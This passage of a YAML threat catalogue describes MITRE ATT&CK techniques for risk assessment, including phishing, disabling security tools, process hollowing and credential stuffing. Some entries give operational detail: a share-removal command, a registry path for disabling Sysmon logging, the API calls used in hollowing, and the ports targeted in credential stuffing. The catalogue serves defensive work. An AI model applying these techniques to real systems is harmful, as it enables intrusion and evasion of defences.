      or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd
      Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise
      10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)
      Timers installed using privileged paths may be used to maintain root level persistence.
      Adversaries may also install user level timers to achieve user level persistence.(Citation:
      Falcon Sandbox smp: 28553b3a9d)

      https://attack.mitre.org/techniques/T1053/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566
    ref_id: T1566
    name: Phishing
    description: 'Adversaries may send phishing messages to gain access to victim
      systems. All forms of phishing are electronically delivered social engineering.
      Phishing can be targeted, known as spearphishing. In spearphishing, a specific
      individual, company, or industry will be targeted by the adversary. More generally,
      adversaries can conduct non-targeted phishing, such as in mass malware spam
      campaigns.


      Adversaries may send victims emails containing malicious attachments or links,
      typically to execute malicious code on victim systems. Phishing may also be
      conducted via third-party services, like social media platforms. Phishing may
      also involve social engineering techniques, such as posing as a trusted source,
      as well as evasive techniques such as removing or manipulating emails or metadata/headers
      from compromised accounts being abused to send messages (e.g., [Email Hiding
      Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft
      OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way
      to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the
      identity of the sender which can be used to fool both the human recipient as
      well as automated security tools,(Citation: cyberproof-double-bounce) or by
      including the intended target as a party to an existing email thread that includes
      malicious files or links (i.e., "thread hijacking").(Citation: phishing-krebs)


      Victims may also receive phishing messages that instruct them to call a phone
      number where they are directed to visit a malicious URL, download malware,(Citation:
      sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software)
      or install adversary-accessible remote management tools onto their computer
      (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation:
      Unit42 Luna Moth)

      https://attack.mitre.org/techniques/T1566'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.004
    ref_id: T1542.004
    name: ROMMONkit
    description: 'Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized
      firmware with adversary code to provide persistent access and manipulate device
      behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation:
      Cisco Blog Legacy Device Attacks)



      ROMMON is a Cisco network device firmware that functions as a boot loader, boot
      image, or boot helper to initialize hardware and software when the platform
      is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005),
      an adversary may upgrade the ROMMON image locally or remotely (for example,
      through TFTP) with adversary code and restart the device in order to overwrite
      the existing ROMMON image. This provides adversaries with the means to update
      the ROMMON to gain persistence on a system in a way that may be difficult to
      detect.

      https://attack.mitre.org/techniques/T1542/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.001
    ref_id: T1218.001
    name: Compiled HTML File
    description: 'Adversaries may abuse Compiled HTML files (.chm) to conceal malicious
      code. CHM files are commonly distributed as part of the Microsoft HTML Help
      system. CHM files are compressed compilations of various content such as HTML
      documents, images, and scripting/web related programming languages such VBA,
      JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content
      is displayed using underlying components of the Internet Explorer browser (Citation:
      Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe).
      (Citation: Microsoft HTML Help Executable Program)


      A custom CHM file containing embedded payloads could be delivered to a victim
      then triggered by [User Execution](https://attack.mitre.org/techniques/T1204).
      CHM execution may also bypass application application control on older and/or
      unpatched systems that do not account for execution of binaries through hh.exe.
      (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)

      https://attack.mitre.org/techniques/T1218/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.001
    ref_id: T1496.001
    name: Compute Hijacking
    description: "Adversaries may leverage the compute resources of co-opted systems\
      \ to complete resource-intensive tasks, which may impact system and/or hosted\
      \ service availability. \n\nOne common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001)\
      \ is to validate transactions of cryptocurrency networks and earn virtual currency.\
      \ Adversaries may consume enough system resources to negatively impact and/or\
      \ cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus\
      \ Under The Hood Blog 2017) Servers and cloud-based systems are common targets\
      \ because of the high potential for available resources, but user endpoint systems\
      \ may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001)\
      \ and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized\
      \ environments may also be targeted due to the ease of deployment via exposed\
      \ APIs and the potential for scaling mining activities by deploying or compromising\
      \ multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard\
      \ Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some\
      \ cryptocurrency mining malware identify then kill off processes for competing\
      \ malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro\
      \ War of Crypto Miners)\nhttps://attack.mitre.org/techniques/T1496/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.005
    ref_id: T1070.005
    name: Network Share Connection Removal
    description: 'Adversaries may remove share connections that are no longer useful
      in order to clean up traces of their operation. Windows shared drive and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can
      be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039)
      is an example utility that can be used to remove network share connections with
      the <code>net use \\system\share /delete</code> command. (Citation: Technet
      Net Use)

      https://attack.mitre.org/techniques/T1070/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.003
    ref_id: T1090.003
    name: Multi-hop Proxy
    description: "Adversaries may chain together multiple proxies to disguise the\
      \ source of malicious traffic. Typically, a defender will be able to identify\
      \ the last proxy traffic traversed before it enters their network; the defender\
      \ may or may not be able to identify any previous proxies before the last-hop\
      \ proxy. This technique makes identifying the original source of the malicious\
      \ traffic even more difficult by requiring the defender to trace malicious traffic\
      \ through several proxies to identify its source.\n\nFor example, adversaries\
      \ may construct or use onion routing networks \u2013 such as the publicly available\
      \ [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport\
      \ encrypted C2 traffic through a compromised population, allowing communication\
      \ with any device within the network.(Citation: Onion Routing) Adversaries may\
      \ also use operational relay box (ORB) networks composed of virtual private\
      \ servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life\
      \ routers to obfuscate their operations. (Citation: ORB Mandiant) \n\nIn the\
      \ case of network infrastructure, it is possible for an adversary to leverage\
      \ multiple compromised devices to create a multi-hop proxy chain (i.e., [Network\
      \ Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch\
      \ System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries\
      \ can add custom code to the affected network devices that will implement onion\
      \ routing between those nodes. This method is dependent upon the [Network Boundary\
      \ Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries\
      \ to cross the protected network boundary of the Internet perimeter and into\
      \ the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may\
      \ be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer\
      \ (P2P) and blockchain-oriented infrastructure to implement routing between\
      \ a decentralized network of peers.(Citation: NGLite Trojan)\nhttps://attack.mitre.org/techniques/T1090/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110
    ref_id: T1110
    name: Brute Force
    description: 'Adversaries may use brute force techniques to gain access to accounts
      when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro
      Pawn Storm Dec 2020) Without knowledge of the password for an account or set
      of accounts, an adversary may systematically guess the password using a repetitive
      or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords
      can take place via interaction with a service that will check the validity of
      those credentials or offline against previously acquired credential data, such
      as password hashes.


      Brute forcing credentials may take place at various points during a breach.
      For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      within a victim environment leveraging knowledge gathered from other post-compromise
      behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003),
      [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password
      Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may
      also combine brute forcing activity with behaviors such as [External Remote
      Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.

      https://attack.mitre.org/techniques/T1110'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.004
    ref_id: T1059.004
    name: Unix Shell
    description: 'Adversaries may abuse Unix shell commands and scripts for execution.
      Unix shells are the primary command prompt on Linux and macOS systems, though
      many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending
      on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell)
      Unix shells can control every aspect of a system, with certain commands requiring
      elevated privileges.


      Unix shells also support scripts that enable sequential execution of commands
      as well as other typical programming operations such as conditionals and loops.
      Common uses of shell scripts include long or repetitive tasks, or the need to
      run the same set of commands on multiple systems.


      Adversaries may abuse Unix shells to execute various commands or payloads. Interactive
      shells may be accessed through command and control channels or during lateral
      movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004).
      Adversaries may also leverage shell scripts to deliver and execute multiple
      commands on victims or as part of payloads used for persistence.

      https://attack.mitre.org/techniques/T1059/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.003
    ref_id: T1137.003
    name: Outlook Forms
    description: "Adversaries may abuse Microsoft Outlook forms to obtain persistence\
      \ on a compromised system. Outlook forms are used as templates for presentation\
      \ and functionality in Outlook messages. Custom Outlook forms can be created\
      \ that will execute code when a specifically crafted email is sent by an adversary\
      \ utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\n\
      \nOnce malicious forms have been added to the user\u2019s mailbox, they will\
      \ be loaded when Outlook is started. Malicious forms will execute when an adversary\
      \ sends a specifically crafted email to the user.(Citation: SensePost Outlook\
      \ Forms)\nhttps://attack.mitre.org/techniques/T1137/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.001
    ref_id: T1562.001
    name: Disable or Modify Tools
    description: "Adversaries may modify and/or disable security tools to avoid possible\
      \ detection of their malware/tools and activities. This may take many forms,\
      \ such as killing security software processes or services, modifying / deleting\
      \ Registry keys or configuration files so that tools do not operate properly,\
      \ or other methods to interfere with security tools scanning or reporting information.\
      \ Adversaries may also disable updates to prevent the latest security patches\
      \ from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\n\
      Adversaries may also tamper with artifacts deployed and utilized by security\
      \ tools. Security tools may make dynamic changes to system components in order\
      \ to maintain visibility into specific events. For example, security products\
      \ may load their own modules and/or modify those loaded by processes to facilitate\
      \ data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006),\
      \ adversaries may unhook or otherwise modify these features added by tools (especially\
      \ those that exist in userland or are otherwise potentially accessible to adversaries)\
      \ to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System\
      \ Calls) \n\nAdversaries may also focus on specific applications such as Sysmon.\
      \ For example, the \u201CStart\u201D and \u201CEnable\u201D values in <code>HKEY_LOCAL_MACHINE\\\
      SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>\
      \ may be modified to tamper with and potentially disable Sysmon logging.(Citation:\
      \ disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to\
      \ skip digital signature verification checks by altering startup configuration\
      \ files and effectively disabling firmware verification that typically occurs\
      \ at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected\
      \ Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\
      \nIn cloud environments, tools disabled by adversaries may include cloud monitoring\
      \ agents that report back to services such as AWS CloudWatch or Google Cloud\
      \ Monitor.\n\nFurthermore, although defensive tools may have anti-tampering\
      \ mechanisms, adversaries may abuse tools such as legitimate rootkit removal\
      \ kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation:\
      \ dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike)\
      \ For example, adversaries have used tools such as GMER to find and shut down\
      \ hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\
      \nAdditionally, adversaries may exploit legitimate drivers from anti-virus software\
      \ to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)),\
      \ which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)\n\
      https://attack.mitre.org/techniques/T1562/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565
    ref_id: T1565
    name: Data Manipulation
    description: 'Adversaries may insert, delete, or manipulate data in order to influence
      external outcomes or hide activity, thus threatening the integrity of the data.(Citation:
      Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt
      to affect a business process, organizational understanding, or decision making.


      The type of modification and the impact it will have depends on the target application
      and process as well as the goals and objectives of the adversary. For complex
      systems, an adversary would likely need special expertise and possibly access
      to specialized software related to the system that would typically be gained
      through a prolonged information gathering campaign in order to have the desired
      impact.

      https://attack.mitre.org/techniques/T1565'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559
    ref_id: T1559
    name: Inter-Process Communication
    description: "Adversaries may abuse inter-process communication (IPC) mechanisms\
      \ for local code or command execution. IPC is typically used by processes to\
      \ share data, communicate with each other, or synchronize execution. IPC is\
      \ also commonly used to avoid situations such as deadlocks, which occurs when\
      \ processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse\
      \ IPC to execute arbitrary code or commands. IPC mechanisms may differ depending\
      \ on OS, but typically exists in a form accessible through programming languages/libraries\
      \ or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)\
      \ or [Component Object Model](https://attack.mitre.org/techniques/T1559/001).\
      \ Linux environments support several different IPC mechanisms, two of which\
      \ being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums,\
      \ such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s,\
      \ may also leverage underlying IPC mechanisms. Adversaries may also use [Remote\
      \ Services](https://attack.mitre.org/techniques/T1021) such as [Distributed\
      \ Component Object Model](https://attack.mitre.org/techniques/T1021/003) to\
      \ facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)\n\
      https://attack.mitre.org/techniques/T1559"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001
    ref_id: T1001
    name: Data Obfuscation
    description: 'Adversaries may obfuscate command and control traffic to make it
      more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November
      2020) Command and control (C2) communications are hidden (but not necessarily
      encrypted) in an attempt to make the content more difficult to discover or decipher
      and to make the communication less conspicuous and hide commands from being
      seen. This encompasses many methods, such as adding junk data to protocol traffic,
      using steganography, or impersonating legitimate protocols.

      https://attack.mitre.org/techniques/T1001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1039
    ref_id: T1039
    name: Data from Network Shared Drive
    description: 'Adversaries may search network shares on computers they have compromised
      to find files of interest. Sensitive data can be collected from remote systems
      via shared network drives (host shared directory, network file server, etc.)
      that are accessible from the current system prior to Exfiltration. Interactive
      command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      may be used to gather information.

      https://attack.mitre.org/techniques/T1039'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.006
    ref_id: T1584.006
    name: Web Services
    description: "Adversaries may compromise access to third-party web services\_\
      that can be used during targeting. A variety of popular websites exist for legitimate\
      \ users to register for web-based services, such as GitHub, Twitter, Dropbox,\
      \ Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate\
      \ user's access to a web service and use that web service as infrastructure\
      \ in support of cyber operations. Such web services can be abused during later\
      \ stages of the adversary lifecycle, such as during Command and Control ([Web\
      \ Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web\
      \ Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation:\
      \ Recorded Future Turla Infra 2020) Using common services, such as those offered\
      \ by Google or Twitter, makes it easier for adversaries to hide in expected\
      \ noise. By utilizing a web service, particularly when access is stolen from\
      \ legitimate users, adversaries can make it difficult to physically tie back\
      \ operations to them. Additionally, leveraging compromised web-based email services\
      \ may allow adversaries to leverage the trust associated with legitimate domains.\n\
      https://attack.mitre.org/techniques/T1584/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1601
    ref_id: T1601
    name: Modify System Image
    description: 'Adversaries may make changes to the operating system of embedded
      network devices to weaken defenses and provide new capabilities for themselves.  On
      such devices, the operating systems are typically monolithic and most of the
      device functionality and capabilities are contained within a single file.


      To change the operating system, the adversary typically only needs to affect
      this one file, replacing or modifying it.  This can either be done live in memory
      during system runtime for immediate effect, or in storage to implement the change
      on the next boot of the network device.

      https://attack.mitre.org/techniques/T1601'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574
    ref_id: T1574
    name: Hijack Execution Flow
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the way operating systems run programs. Hijacking execution flow can be for
      the purposes of persistence, since this hijacked execution may reoccur over
      time. Adversaries may also use these mechanisms to elevate privileges or evade
      defenses, such as application control or other restrictions on execution.


      There are many ways an adversary may hijack the flow of execution, including
      by manipulating how the operating system locates programs to be executed. How
      the operating system locates libraries to be used by a program can also be intercepted.
      Locations where the operating system looks for programs/resources, such as file
      directories and in the case of Windows the Registry, could also be poisoned
      to include malicious payloads.

      https://attack.mitre.org/techniques/T1574'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.011
    ref_id: T1059.011
    name: Lua
    description: 'Adversaries may abuse Lua commands and scripts for execution. Lua
      is a cross-platform scripting and programming language primarily designed for
      embedded use in applications. Lua can be executed on the command-line (through
      the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded
      programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation:
      Lua state)


      Lua scripts may be executed by adversaries for malicious purposes. Adversaries
      may incorporate, abuse, or replace existing Lua interpreters to allow for malicious
      Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint
      Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)

      https://attack.mitre.org/techniques/T1059/011'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.005
    ref_id: T1027.005
    name: Indicator Removal from Tools
    description: 'Adversaries may remove indicators from tools if they believe their
      malicious tool was detected, quarantined, or otherwise curtailed. They can modify
      the tool by removing the indicator and using the updated version that is no
      longer detected by the target''s defensive systems or subsequent targets that
      may use similar systems.


      A good example of this is when malware is detected with a file signature and
      quarantined by anti-virus software. An adversary who can determine that the
      malware was quarantined because of its file signature may modify the file to
      explicitly avoid that signature, and then re-use the malware.

      https://attack.mitre.org/techniques/T1027/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.003
    ref_id: T1204.003
    name: Malicious Image
    description: 'Adversaries may rely on a user running a malicious image to facilitate
      execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud
      Platform (GCP) Images, and Azure Images as well as popular container runtimes
      such as Docker can be backdoored. Backdoored images may be uploaded to a public
      repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001),
      and users may then download and deploy an instance or container from the image
      without realizing the image is malicious, thus bypassing techniques that specifically
      achieve Initial Access. This can lead to the execution of malicious code, such
      as code that executes cryptocurrency mining, in the instance or container.(Citation:
      Summit Route Malicious AMIs)


      Adversaries may also name images a certain way to increase the chance of users
      mistakenly deploying an instance or container from the image (ex: [Match Legitimate
      Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation:
      Aqua Security Cloud Native Threat Report June 2021)

      https://attack.mitre.org/techniques/T1204/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.005
    ref_id: T1543.005
    name: Container Service
    description: 'Adversaries may create or modify container or container cluster
      management tools that run as daemons, agents, or services on individual hosts.
      These include software for creating and managing individual containers, such
      as Docker and Podman, as well as container cluster node-level agents such as
      kubelet. By modifying these services, an adversary may be able to achieve persistence
      or escalate their privileges on a host.


      For example, by using the `docker run` or `podman run` command with the `restart=always`
      directive, a container can be configured to persistently restart on the host.(Citation:
      AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may
      also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)


      In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy
      Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including
      ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation:
      Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the
      `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning
      Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)


      Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation:
      Podman Systemd)(Citation: Docker Systemd)

      https://attack.mitre.org/techniques/T1543/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078
    ref_id: T1078
    name: Valid Accounts
    description: 'Adversaries may obtain and abuse credentials of existing accounts
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Compromised credentials may be used to bypass access controls
      placed on various resources on systems within the network and may even be used
      for persistent access to remote systems and externally available services, such
      as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation:
      volexity_0day_sophos_FW) Compromised credentials may also grant an adversary
      increased privilege to specific systems or access to restricted areas of the
      network. Adversaries may choose not to use malware or tools in conjunction with
      the legitimate access those credentials provide to make it harder to detect
      their presence.


      In some cases, adversaries may abuse inactive accounts: for example, those belonging
      to individuals who are no longer part of an organization. Using these accounts
      may allow the adversary to evade detection, as the original account user will
      not be present to identify any anomalous activity taking place on their account.(Citation:
      CISA MFA PrintNightmare)


      The overlap of permissions for local, domain, and cloud accounts across a network
      of systems is of concern because the adversary may be able to pivot across accounts
      and systems to reach a high level of access (i.e., domain or enterprise administrator)
      to bypass access controls set within the enterprise.(Citation: TechNet Credential
      Theft)

      https://attack.mitre.org/techniques/T1078'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1571
    ref_id: T1571
    name: Non-Standard Port
    description: 'Adversaries may communicate using a protocol and port pairing that
      are typically not associated. For example, HTTPS over port 8088(Citation: Symantec
      Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed
      to the traditional port 443. Adversaries may make changes to the standard port
      used by a protocol to bypass filtering or muddle analysis/parsing of network
      data.


      Adversaries may also make changes to victim systems to abuse non-standard ports.
      For example, Registry keys and other configuration settings can be used to modify
      protocol and port pairings.(Citation: change_rdp_port_conti)

      https://attack.mitre.org/techniques/T1571'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.001
    ref_id: T1585.001
    name: Social Media Accounts
    description: "Adversaries may create and cultivate social media accounts that\
      \ can be used during targeting. Adversaries can create social media accounts\
      \ that can be used to build a persona to further operations. Persona development\
      \ consists of the development of public information, presence, history and appropriate\
      \ affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor\
      \ operations incorporating social engineering, the utilization of a persona\
      \ on social media may be important. These personas may be fictitious or impersonate\
      \ real people. The persona may exist on a single social media site or across\
      \ multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona\
      \  on social media may require development of additional documentation to make\
      \ them seem real. This could include filling out profile information, developing\
      \ social networks, or incorporating photos. \n\nOnce a persona has been developed\
      \ an adversary can use it to create connections to targets of interest. These\
      \ connections may be direct or may include trying to connect through others.(Citation:\
      \ NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged\
      \ during other phases of the adversary lifecycle, such as during Initial Access\
      \ (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).\n\
      https://attack.mitre.org/techniques/T1585/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.012
    ref_id: T1055.012
    name: Process Hollowing
    description: "Adversaries may inject malicious code into suspended and hollowed\
      \ processes in order to evade process-based defenses. Process hollowing is a\
      \ method of executing arbitrary code in the address space of a separate live\
      \ process.  \n\nProcess hollowing is commonly performed by creating a process\
      \ in a suspended state then unmapping/hollowing its memory, which can then be\
      \ replaced with malicious code. A victim process can be created with native\
      \ Windows API calls such as <code>CreateProcess</code>, which includes a flag\
      \ to suspend the processes primary thread. At this point the process can be\
      \ unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>\
      \  before being written to, realigned to the injected code, and resumed via\
      \ <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>,\
      \ then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation:\
      \ Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local\
      \ Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new\
      \ process rather than targeting an existing process. This behavior will likely\
      \ not result in elevated privileges since the injected process was spawned from\
      \ (and thus inherits the security context) of the injecting process. However,\
      \ execution via process hollowing may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1068
    ref_id: T1068
    name: Exploitation for Privilege Escalation
    description: 'Adversaries may exploit software vulnerabilities in an attempt to
      elevate privileges. Exploitation of a software vulnerability occurs when an
      adversary takes advantage of a programming error in a program, service, or within
      the operating system software or kernel itself to execute adversary-controlled
      code. Security constructs such as permission levels will often hinder access
      to information and use of certain techniques, so adversaries will likely need
      to perform privilege escalation to include use of software exploitation to circumvent
      those restrictions.


      When initially gaining access to a system, an adversary may be operating within
      a lower privileged process which will prevent them from accessing certain resources
      on the system. Vulnerabilities may exist, usually in operating system components
      and software commonly running at higher permissions, that can be exploited to
      gain higher levels of access on the system. This could enable someone to move
      from unprivileged or user level permissions to SYSTEM or root permissions depending
      on the component that is vulnerable. This could also enable an adversary to
      move from a virtualized environment, such as within a virtual machine or container,
      onto the underlying host. This may be a necessary step for an adversary compromising
      an endpoint system that has been properly configured and limits other privilege
      escalation methods.


      Adversaries may bring a signed vulnerable driver onto a compromised machine
      so that they can exploit the vulnerability to execute code in kernel mode. This
      process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation:
      ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may
      include the vulnerable driver with files delivered during Initial Access or
      download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)
      or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).

      https://attack.mitre.org/techniques/T1068'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.009
    ref_id: T1564.009
    name: Resource Forking
    description: "Adversaries may abuse resource forks to hide malicious code or executables\
      \ to evade detection and bypass security applications. A resource fork provides\
      \ applications a structured way to store resources such as thumbnail images,\
      \ menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical\
      \ File System Overview) Usage of a resource fork is identifiable when displaying\
      \ a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr\
      \ -l</code> commands. Resource forks have been deprecated and replaced with\
      \ the application bundle structure. Non-localized resources are placed at the\
      \ top level directory of an application bundle, while localized resources are\
      \ placed in the <code>/Resources</code> folder.(Citation: Resource and Data\
      \ Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource\
      \ forks to hide malicious data that may otherwise be stored directly in files.\
      \ Adversaries can execute content with an attached resource fork, at a specified\
      \ offset, that is moved to an executable location then invoked. Resource fork\
      \ content may also be obfuscated/encrypted until execution.(Citation: sentinellabs\
      \ resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)\n\
      https://attack.mitre.org/techniques/T1564/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1531
    ref_id: T1531
    name: Account Access Removal
    description: "Adversaries may interrupt availability of system and network resources\
      \ by inhibiting access to accounts utilized by legitimate users. Accounts may\
      \ be deleted, locked, or manipulated (ex: changed credentials) to remove access\
      \ to accounts. Adversaries may also subsequently log off and/or perform a [System\
      \ Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious\
      \ changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42\
      \ LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039)\
      \ utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code>\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be\
      \ used by adversaries to modify user accounts. In Linux, the <code>passwd</code>\
      \ utility may be used to change passwords. Accounts could also be disabled by\
      \ Group Policy. \n\nAdversaries who use ransomware or similar attacks may first\
      \ perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485)\
      \ and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede\
      \ incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)\
      \ objective.\nhttps://attack.mitre.org/techniques/T1531"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.004
    ref_id: T1110.004
    name: Credential Stuffing
    description: 'Adversaries may use credentials obtained from breach dumps of unrelated
      accounts to gain access to target accounts through credential overlap. Occasionally,
      large numbers of username and password pairs are dumped online when a website
      or service is compromised and the user account credentials accessed. The information
      may be useful to an adversary attempting to compromise accounts by taking advantage
      of the tendency for users to use the same passwords across personal and business
      accounts.


      Credential stuffing is a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies.


      Typically, management services over commonly used ports are used when stuffing
      credentials. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)


      In addition to management services, adversaries may "target single sign-on (SSO)
